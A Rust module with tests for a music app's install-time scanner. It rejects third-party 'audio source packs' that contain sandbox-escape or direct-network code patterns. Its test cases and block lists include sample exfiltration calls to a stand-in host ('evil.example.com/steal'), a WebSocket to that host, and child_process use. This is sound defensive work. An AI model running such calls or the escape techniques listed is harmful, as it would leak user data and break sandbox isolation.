//! 音源包内容安全扫描（安装期第一道内容闸）。
//!
//! ## 定位：纵深防御的「预警层」，不是唯一防线
//!
//! 签名（[`crate::pack_signature`]）证明**来源**，本模块检查**内容形态**：
//! 在包文本进入安装管线前，扫描高风险代码特征，把明显的逃逸尝试挡在门外。
//! 它与运行时隔离（引擎窗口 IPC 白名单 / WebView 无桥 + 网络收紧）互为冗余——
//! 即使某条规则被绕过，运行时层还有硬防线。
//!
//! ## 规则形态（与 qt-uniappx `services/pack-safety.uts` 逐条一致，改动须两端同步）
//!
//! - **RAW**：纯子串匹配。用于高置信词（宿主桥名字、外联 API 名），
//!   正常包文本里不应出现这些字符序列；
//! - **CALL**：`词(` 且前一字符不是 `[A-Za-z0-9_$.]`（排除 `backend.fetch(`、
//!   `prefetch(` 这类方法/长词前缀），用于「调用形态」判定。
//!
//! 刻意**不拦** `eval(` / `Function(`：crypto-js 的 `Function("return this")()`
//! 探测是作者内联加密库的标配（官方包产物里就有），拦了会误杀主流第三方包；
//! 且在桥/网络/文件已全部封死的运行时里，动态执行无法提权，唯一价值是
//! 绕过本扫描——而本扫描名单的每一项在运行时另有硬防线。
//!
//! ## 官方包策略：签名即背书
//!
//! 官方保留 id 的包已通过 ed25519 发布签名校验（来源可信），扫描命中只记日志、
//! 不阻断——官方产物里的良性字样（如 `"X-Requested-With": "XMLHttpRequest"`
//! 请求头字符串）不应导致自家包装不上。第三方包无任何背书，命中即拒。

/// RAW 规则：命中即记（第三方拒绝、官方日志）。(模式, 拒绝理由)
const RAW_PATTERNS: &[(&str, &str)] = &[
    // ---- 宿主/系统桥：拿到即可能越出引擎沙箱 ----
    (
        "__TAURI_INTERNALS__",
        "Tauri IPC 内部对象（可跨过引擎窗口直接调用应用命令）",
    ),
    (
        "__TAURI__",
        "Tauri 宿主桥（可跨过引擎窗口直接调用应用命令）",
    ),
    ("ipcRenderer", "Electron IPC 桥"),
    ("webkit.messageHandlers", "WKWebView 原生桥"),
    ("UTSAndroid", "uni-app x 原生桥"),
    ("io.dcloud", "uni-app 原生运行时"),
    // ---- 自由外联面：绕过宿主网络出口（builtin_request 的协议/内网校验）----
    ("WebSocket", "自由长连接（绕过宿主网络出口）"),
    ("EventSource", "SSE 外联（绕过宿主网络出口）"),
    ("sendBeacon", "浏览器上报通道（绕过宿主网络出口）"),
    ("new XMLHttpRequest", "XHR 直连（绕过宿主网络出口）"),
    // ---- 后台执行体 ----
    ("importScripts", "Worker 脚本注入"),
    ("new Worker(", "后台 Worker（不受引擎生命周期管理）"),
    ("ServiceWorker", "Service Worker（可劫持引擎页网络）"),
    ("serviceWorker", "Service Worker（可劫持引擎页网络）"),
    // ---- Node/本地文件面（引擎环境本就不该出现）----
    ("child_process", "Node 子进程"),
    ("process.binding", "Node 进程内 API"),
    ("content://", "Android 内容提供器访问"),
];

/// CALL 规则：`模式(` + 前一字符不是标识符/属性访问的一部分。
const CALL_PATTERNS: &[(&str, &str)] = &[
    (
        "fetch(",
        "全局 fetch 直连（音源包的网络出口只能是 host.request）",
    ),
    ("require(", "CommonJS require（引擎是 ESM 环境，无此全局）"),
];

/// `c` 是否为标识符字符或 `.`（CALL 形态里这些前缀意味着方法调用/更长标识符）。
fn is_ident_or_dot(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '_' || c == '$' || c == '.'
}

/// 在 `text` 中找 CALL 形态的 `pattern`（首个命中下标；无则 None）。
///
/// 命中条件：出现 `pattern` 且其前一个字符不是标识符/`.`——
/// `backend.fetch(songId)`（方法调用）与 `prefetch(url)`（长词）都不算，
/// `fetch("https://…")`、`await fetch(…)`、`;(fetch)(` 之类才算全局调用。
fn find_call_pattern(text: &str, pattern: &str) -> Option<usize> {
    let mut from = 0usize;
    while let Some(rel) = text[from..].find(pattern) {
        let idx = from + rel;
        let ok_prefix = match text[..idx].chars().next_back() {
            None => true, // 文件开头
            Some(c) => !is_ident_or_dot(c),
        };
        if ok_prefix {
            return Some(idx);
        }
        from = idx + pattern.len();
    }
    None
}

/// 命中下标 → 行号（1 起），供错误信息定位。
fn line_of(text: &str, idx: usize) -> usize {
    text[..idx.min(text.len())]
        .bytes()
        .filter(|&b| b == b'\n')
        .count()
        + 1
}

/// 扫描包文本，返回全部命中（模式, 理由, 行号）。扫描对象应是剥掉签名块后的正文。
fn collect_hits(text: &str) -> Vec<(&'static str, &'static str, usize)> {
    let mut hits = Vec::new();
    for (pat, reason) in RAW_PATTERNS {
        if let Some(idx) = text.find(pat) {
            hits.push((*pat, *reason, line_of(text, idx)));
        }
    }
    for (pat, reason) in CALL_PATTERNS {
        if let Some(idx) = find_call_pattern(text, pat) {
            hits.push((*pat, *reason, line_of(text, idx)));
        }
    }
    hits
}

/// 安装期内容安全扫描。
///
/// - 第三方包：任何命中 → `Err`（安装/预览直接拒绝，信息里带命中词与行号）；
/// - 官方包（`official = true`，签名已在上游验过）：命中只 `log::warn`，返回 `Ok`。
pub(crate) fn scan_pack_text(text: &str, official: bool) -> Result<(), String> {
    let hits = collect_hits(text);
    if hits.is_empty() {
        return Ok(());
    }
    if official {
        for (pat, reason, line) in &hits {
            log::warn!("[pack-safety] 官方包命中安全扫描规则（已验签，放行）：{pat}（{reason}）第 {line} 行");
        }
        return Ok(());
    }
    let detail = hits
        .iter()
        .map(|(pat, reason, line)| format!("第 {line} 行：{pat} —— {reason}"))
        .collect::<Vec<_>>()
        .join("；");
    Err(format!(
        "包含不安全代码特征，已拒绝安装：{detail}。\
         音源包只能通过 host.request 访问网络，不能触碰宿主桥/直连网络/后台执行体；\
         若为误报，请调整对应代码写法后重新打包"
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    const OK_BODY: &str = "/*__QT_PACK__{\"kind\":\"play\",\"id\":\"demo\",\"versionCode\":1}*//*__QT_PLAY_PACK_FACTORY__*/\nvar host = globalThis.__qtHost;\nasync function search(request, keyword) { return request('https://api.example.com/q?k=' + encodeURIComponent(keyword)); }\nglobalThis.__qtPlayPackFactory = function (host) { return { search: search }; };\n";

    #[test]
    fn clean_pack_passes() {
        assert!(scan_pack_text(OK_BODY, false).is_ok());
    }

    #[test]
    fn method_and_prefixed_fetch_are_fine() {
        // backend.fetch( / prefetch( 都是常见良性形态，不能误伤
        let text = "const a = await backend.fetch(songId);\nconst b = prefetch(url);\nfunction myrequire(x) { return x; }\nconst c = myrequire(1);\n";
        assert!(scan_pack_text(text, false).is_ok(), "{text}");
    }

    #[test]
    fn global_fetch_is_rejected() {
        for text in [
            "fetch('https://evil.example.com/steal?d=1')",
            "await fetch(u)",
            ";fetch(u)",
            "return fetch(u).then(r => r.text())",
        ] {
            let err = scan_pack_text(text, false).expect_err(text);
            assert!(err.contains("fetch("), "{text} -> {err}");
        }
        // window.fetch( 前一字符是 '.'（方法形态），静态层不拦——由运行时
        // 包装/删除层兜底（见 source_engine_page.html lockDownNetwork）
        assert!(scan_pack_text("window.fetch(u)", false).is_ok());
    }

    #[test]
    fn require_is_rejected() {
        let err = scan_pack_text("const fs = require('fs')", false).unwrap_err();
        assert!(err.contains("require("));
        // myrequire( 不算
        assert!(scan_pack_text("const fs = myrequire('fs')", false).is_ok());
    }

    #[test]
    fn bridge_tokens_are_rejected() {
        for pat in [
            "__TAURI__",
            "__TAURI_INTERNALS__.invoke",
            "window.ipcRenderer",
            "webkit.messageHandlers.app",
            "UTSAndroid.getAPIVersion()",
            "io.dcloud.uts",
        ] {
            let err = scan_pack_text(&format!("const t = {pat};"), false)
                .expect_err(&format!("{pat} 应被拒绝"));
            assert!(err.contains("包含不安全代码特征"), "{pat} -> {err}");
        }
    }

    #[test]
    fn network_and_worker_tokens_are_rejected() {
        for pat in [
            "new WebSocket('wss://evil.example.com')",
            "new EventSource('/stream')",
            "navigator.sendBeacon(url, data)",
            "new XMLHttpRequest()",
            "importScripts('a.js')",
            "new Worker('/w.js')",
            "navigator.serviceWorker.register('/sw.js')",
        ] {
            assert!(scan_pack_text(&format!("const w = {pat};"), false)
                .map_err(|e| format!("{pat} 应被拒绝: {e}"))
                .is_err());
        }
    }

    #[test]
    fn node_and_content_tokens_are_rejected() {
        for pat in [
            "child_process.exec",
            "process.binding('natives')",
            "content://media/external",
        ] {
            assert!(scan_pack_text(pat, false).is_err(), "{pat} 应被拒绝");
        }
    }

    #[test]
    fn xhr_header_string_is_not_a_hit() {
        // 官方 qq 线路的真实形态：请求头值里出现该词，不是 new XHR
        let text = "headers: { 'X-Requested-With': 'XMLHttpRequest' },";
        assert!(scan_pack_text(text, false).is_ok());
    }

    #[test]
    fn official_pack_passes_but_is_visible_in_log() {
        // 官方包即使命中也放行（签名上游已验；良性字样不应挡自家包）
        let text = "const ws = 'WebSocket';\nfetch('https://a.b')";
        assert!(scan_pack_text(text, true).is_ok());
    }

    #[test]
    fn cryptojs_global_probe_is_fine() {
        // crypto-js 标准 globalThis 探测（官方产物原样），刻意不拦
        let text = "const g = Function(\"return this\")();\nconst e = (0, eval)('1');";
        assert!(scan_pack_text(text, false).is_ok());
    }

    #[test]
    fn hit_line_number_is_reported() {
        let text = "line1\nline2\nnew XMLHttpRequest();\n";
        let err = scan_pack_text(text, false).unwrap_err();
        assert!(err.contains("第 3 行"), "{err}");
    }
}
